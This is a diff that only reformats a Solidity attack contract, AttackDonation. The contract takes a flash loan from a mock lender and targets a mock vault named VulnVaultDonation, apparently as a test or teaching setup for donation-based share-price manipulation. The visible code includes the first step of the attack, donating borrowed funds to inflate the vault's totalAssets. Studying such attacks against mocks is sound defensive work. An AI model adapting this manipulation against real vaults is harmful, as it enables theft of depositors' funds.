@@ -20,11 +20,7 @@ contract AttackDonation is IFlashBorrower {
 
     error NotOwner();
 
-    constructor(
-        MockERC20 _asset,
-        FlashLenderMock _lender,
-        VulnVaultDonation _vault
-    ) {
+    constructor(MockERC20 _asset, FlashLenderMock _lender, VulnVaultDonation _vault) {
         asset = _asset;
         lender = _lender;
         vault = _vault;
@@ -38,12 +34,17 @@ contract AttackDonation is IFlashBorrower {
     }
 
     function onFlashLoan(
-        address /*initiator*/,
-        address /*assetAddr*/,
+        address,
+        /*initiator*/
+        address,
+        /*assetAddr*/
         uint256 amount,
         uint256 fee,
         bytes calldata /*data*/
-    ) external override {
+    )
+        external
+        override
+    {
         require(msg.sender == address(lender), "only lender");
 
         // 1) donate all borrowed funds into the vault (manipulates totalAssets)
